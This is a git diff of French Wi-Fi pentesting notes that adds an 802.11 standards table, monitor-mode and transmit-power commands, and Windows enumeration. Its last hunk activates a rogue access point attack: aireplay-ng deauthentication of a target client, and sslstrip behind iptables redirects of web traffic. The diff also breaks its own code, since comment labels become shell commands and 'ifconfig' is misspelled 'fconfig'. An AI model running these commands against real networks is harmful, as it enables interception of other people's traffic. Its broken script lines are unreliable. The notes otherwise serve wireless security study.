@@ -12,6 +12,8 @@
 
 * [Alfa Card Drivers](https://files.alfa.com.tw/)
 
+* [Wireshark](https://www.wireshark.org/)
+
 
 ## definitions
 
@@ -47,6 +49,22 @@ FHSS : Frequency Hopping Spread Spectrum
 | WPA3 entreprise | 802.1X/EAP | GCMP | AES |||
 
 > Attention à WPA3-personal, censé renforcer WPA2, certaines vulnérabilités sont connues via le protocole SAE. (ex : CertID VU871675, CVE-2019-9494, CVE-2019-9494, CertID VU871675)
+
+## Standards
+
+| Standard     | Fréquence    | Débit maximal théorique | Portée maximale | Année d'introduction |
+|--------------|--------------|-------------------------|-----------------|----------------------|
+| IEEE 802.11  | 2.4 GHz      | 2 Mbps                  | ~20 m           | 1997                 |
+| IEEE 802.11a | 5 GHz        | 54 Mbps                 | ~35 m           | 1999                 |
+| IEEE 802.11b | 2.4 GHz      | 11 Mbps                 | ~35 m           | 1999                 |
+| IEEE 802.11g | 2.4 GHz      | 54 Mbps                 | ~38 m           | 2003                 |
+| IEEE 802.11n | 2.4 GHz / 5 GHz | 600 Mbps           | ~70 m           | 2009                 |
+| IEEE 802.11ac| 5 GHz        | 1.3 Gbps                | ~70 m           | 2013                 |
+| IEEE 802.11ad| 60 GHz       | 7 Gbps                  | ~10 m           | 2012                 |
+| IEEE 802.11ax| 2.4 GHz / 5 GHz / 6 GHz | 10 Gbps    | ~300 m (outdoor)| 2019                 |
+| IEEE 802.11ay| 60 GHz       | 20 Gbps                 | ~300 m (outdoor)| 2021                 |
+| IEEE 802.11be| 2.4 GHz / 5 GHz / 6 GHz | 23 Gbps    | ~300 m (outdoor)| 2024                 |
+
 
 ## Canaux
 
@@ -103,7 +121,7 @@ FHSS : Frequency Hopping Spread Spectrum
 |136    | 5.680           | 
 |140    | 5.700           | 
 
-6GHz : interdit en France
+> 6GHz : interdit en France
 
 ## Le mode monitor
 
@@ -115,10 +133,17 @@ Permet la capture et l'analyse du traffic wifi
 Activer le mode `monitor`, (la carte wifi doit être compatible)
 
 ```sh
-iface = wlan0
-sudo ifconfig $iface down
-sudo iwconfig $iface mode monitor
-sudo ifconfig $iface up
+ip link set wlan0 down
+iw dev wlan0 set type monitor
+ip link set wlan0 up
+```
+
+anciens linux :
+
+```sh
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+fconfig wlan0 up
 ```
 
 Debug en cas d'utilisation de la carte qui empêche le passe en mode monitor : 
@@ -128,7 +153,17 @@ nmcli nm wifi off
 sudo rfkill unblock all
 ```
 
+## puissance
+
+```sh
+iw wlan0 set txpower fixed 3000
+```
+
 ### Windows
+
+```batch
+netsh wlan show interfaces
+```
 
 * [Npcap](https://npcap.com/#download)
 
@@ -140,7 +175,7 @@ Le binaire se trouve dans `C:\Windows\System32\Npcap`
 
 à défaut d'une carte et de drivers compatibles, il faudra se contenter d'une énumeration sommaire 
 
-```powershell
+```batch
 netsh wlan show networks
 ```
 
@@ -283,10 +318,10 @@ function AP3 {
         iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
         iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
         #Attaque par desauthentification:
-        #aireplay-ng -0 15 -a $1 $4
-        #sslstrip standard:
-        #sslstrip -l 10000 -w ./sslstrip_log    
-        #sslstrip2/Leonardo
+        aireplay-ng -0 15 -a $1 $4
+        sslstrip standard:
+        sslstrip -l 10000 -w ./sslstrip_log    
+        sslstrip2/Leonardo
         /root/Documents/Projets/RogueAP/sslstrip2-master/sslstrip.py -l 10000 -w ./leonardo.log
 # }
 export -f AP3
